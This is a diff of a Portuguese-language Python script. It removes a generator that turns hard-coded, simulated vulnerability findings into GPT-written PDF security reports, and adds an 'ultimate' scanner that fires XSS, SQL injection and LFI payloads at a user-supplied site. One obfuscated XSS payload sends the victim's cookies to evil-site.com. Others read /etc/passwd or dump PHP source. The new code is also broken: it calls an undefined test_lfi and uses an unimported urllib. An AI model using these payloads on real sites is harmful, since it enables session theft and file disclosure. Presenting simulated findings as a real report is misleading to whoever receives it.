@@ -1,140 +1,103 @@
-#!/usr/bin/env python3
-import os
+#!/data/data/com.termux/files/usr/bin/python3
+import re
+import time
 import requests
-import json
-from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor
-from fpdf import FPDF
-import openai  # API real da OpenAI
+from urllib.parse import urlparse, quote
 
-# Configurações
-OPENAI_API_KEY = "SUA_CHAVE_DA_OPENAI"  # 🔑 Obtenha em: https://platform.openai.com/
-THREADS = 20
-DOWNLOAD_PATH = os.path.expanduser("~/Downloads")
-
-# Estilo do PDF
-class PDF(FPDF):
-    def header(self):
-        self.set_font('Arial', 'B', 12)
-        self.cell(0, 10, 'RELATÓRIO DE SEGURANÇA - RUSKSCAN AI', 0, 1, 'C')
-    
-    def footer(self):
-        self.set_y(-15)
-        self.set_font('Arial', 'I', 8)
-        self.cell(0, 10, f'Página {self.page_no()}', 0, 0, 'C')
-
-def generate_ai_analysis(vulnerability):
-    """Usa GPT-4 para análise técnica real"""
-    try:
-        response = openai.ChatCompletion.create(
-            model="gpt-4",
-            messages=[
-                {"role": "system", "content": "Você é um especialista em segurança cibernética."},
-                {"role": "user", "content": f"""
-                Explique em termos técnicos e comerciais esta vulnerabilidade:
-                Nome: {vulnerability['name']}
-                Local: {vulnerability['location']}
-                Severidade: {vulnerability['severity']}/10
-                Descrição: {vulnerability['description']}
-
-                Inclua:
-                1. Risco real em linguagem corporativa
-                2. 3 recomendações técnicas
-                3. Impacto financeiro potencial
-                """}
+class UltimateScanner:
+    def __init__(self):
+        self.payloads = {
+            'xss': [
+                # XSS avançado (evasão de WAF)
+                '<svg/onload=alert`1`>',
+                '<img src="x:x" onerror="eval(atob(\'ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vZXZpbC1zaXRlLmNvbS9jb2xsZWN0P2M9Jytkb2N1bWVudC5jb29raWU\'))">',
+                '%26%2394;img src=x onerror=prompt(1)%26%2394;'
+            ],
+            'sqli': [
+                # SQLi inteligente (time-based + boolean-based)
+                "' OR (SELECT 1 FROM pg_sleep(2))--",
+                "' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--",
+                "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--"
+            ],
+            'lfi': [
+                # LFI com wrappers
+                '../../../../etc/passwd%00',
+                'php://filter/convert.base64-encode/resource=index.php'
             ]
-        )
-        return response.choices[0].message['content']
-    except Exception as e:
-        return f"Análise indisponível. Erro: {str(e)}"
-
-def create_pdf_report(vulnerabilities, domain):
-    """Gera PDF profissional"""
-    pdf = PDF()
-    pdf.add_page()
-    pdf.set_font("Arial", size=10)
-
-    # Título dinâmico baseado na urgência
-    max_severity = max(vuln['severity'] for vuln in vulnerabilities)
-    if max_severity >= 9:
-        report_type = "CRITICO"
-    elif max_severity >= 7:
-        report_type = "ALTO-RISCO"
-    else:
-        report_type = "ANALITICO"
-
-    filename = f"{report_type}-Relatorio-{domain}.pdf"
-    filepath = os.path.join(DOWNLOAD_PATH, filename)
-
-    # Cabeçalho
-    pdf.set_font('Arial', 'B', 16)
-    pdf.cell(0, 10, f'Relatório de Vulnerabilidades - {domain}', ln=1)
-    pdf.set_font('Arial', '', 12)
-    pdf.cell(0, 10, f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M')}", ln=1)
-    pdf.ln(10)
-
-    # Resumo executivo (gerado por IA)
-    pdf.set_font('Arial', 'B', 14)
-    pdf.cell(0, 10, 'Resumo Executivo', ln=1)
-    pdf.set_font('Arial', '', 10)
-    summary = generate_ai_analysis({
-        "name": "Resumo Geral",
-        "location": domain,
-        "severity": max_severity,
-        "description": f"Análise consolidada de {len(vulnerabilities)} vulnerabilidades"
-    })
-    pdf.multi_cell(0, 5, summary)
-    pdf.ln(5)
-
-    # Detalhes por vulnerabilidade
-    pdf.set_font('Arial', 'B', 14)
-    pdf.cell(0, 10, 'Vulnerabilidades Detalhadas', ln=1)
-    
-    for vuln in vulnerabilities:
-        pdf.set_font('Arial', 'B', 12)
-        pdf.cell(0, 10, f"{vuln['name']} (Severidade: {vuln['severity']}/10)", ln=1)
-        
-        pdf.set_font('Arial', '', 10)
-        pdf.cell(0, 5, f"Local: {vuln['location']}", ln=1)
-        
-        analysis = generate_ai_analysis(vuln)
-        pdf.multi_cell(0, 5, analysis)
-        pdf.ln(3)
-    
-    # Salva o PDF
-    pdf.output(filepath)
-    return filepath
-
-def scan_website(target):
-    """Função de escaneamento simulada (substitua pelo scanner real)"""
-    return [
-        {
-            "name": "SQL Injection",
-            "severity": 9,
-            "location": f"{target}/login.php?id=1'",
-            "description": "Parâmetro vulnerável a injeção SQL clássica"
-        },
-        {
-            "name": "XSS Armazenado",
-            "severity": 8,
-            "location": f"{target}/comments",
-            "description": "Campo de comentários aceita scripts persistentes"
         }
-    ]
+        
+        self.headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
+            'X-Forwarded-For': '192.168.1.1'
+        }
 
-def main():
-    openai.api_key = OPENAI_API_KEY  # Configura API real
-    
-    target = input("Digite o domínio alvo (ex: google.com): ").strip()
-    
-    print("\n[+] Escaneando alvo...")
-    vulnerabilities = scan_website(target)
-    
-    print("[+] Gerando relatório PDF profissional...")
-    pdf_path = create_pdf_report(vulnerabilities, target)
-    
-    print(f"\n[✓] Relatório salvo em: {pdf_path}")
-    print("Pronto para envio imediato!")
+    def scan(self, url):
+        print(f"\n[+] Iniciando scan ULTIMATE em: {url}")
+        self.test_xss(url)
+        self.test_sqli(url)
+        self.test_lfi(url)
+        self.check_headers(url)
+
+    def test_xss(self, url):
+        print("\n[++] Testando XSS Avançado...")
+        for payload in self.payloads['xss']:
+            try:
+                # Teste em parâmetros GET
+                parsed = urlparse(url)
+                params = {k: payload for k in parsed.query.split('&')}
+                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(params)}"
+                
+                r = requests.get(test_url, headers=self.headers, timeout=15)
+                if payload.lower() in r.text.lower():
+                    print(f"[!] XSS Detectado: {payload}")
+                
+                # Teste em headers/cookies
+                headers = {**self.headers, 'Referer': payload}
+                requests.get(url, headers=headers)
+                
+            except Exception as e:
+                continue
+
+    def test_sqli(self, url):
+        print("\n[++] Testando SQLi Avançado...")
+        for payload in self.payloads['sqli']:
+            try:
+                start_time = time.time()
+                r = requests.get(f"{url}{quote(payload)}", headers=self.headers, timeout=20)
+                
+                # Time-Based Detection
+                if time.time() - start_time > 2:
+                    print(f"[!] SQLi (Time-Based): {payload}")
+                
+                # Error-Based Detection
+                elif any(word in r.text.lower() for word in ['error', 'sql', 'syntax']):
+                    print(f"[!] SQLi (Error-Based): {payload}")
+                    
+            except:
+                continue
+
+    def check_headers(self, url):
+        print("\n[++] Verificando Headers...")
+        try:
+            r = requests.get(url, headers=self.headers)
+            security_headers = {
+                'CSP': 'Content-Security-Policy',
+                'HSTS': 'Strict-Transport-Security',
+                'XSS': 'X-XSS-Protection'
+            }
+            
+            for name, header in security_headers.items():
+                if header not in r.headers:
+                    print(f"[!] Header de Segurança Ausente: {name}")
+                    
+        except Exception as e:
+            print(f"[-] Erro ao verificar headers: {str(e)}")
 
 if __name__ == "__main__":
-    main()
+    import sys
+    if len(sys.argv) < 2:
+        print("Uso: python3 ruskscan_ultimate.py http://alvo.com")
+        sys.exit()
+    
+    scanner = UltimateScanner()
+    scanner.scan(sys.argv[1])
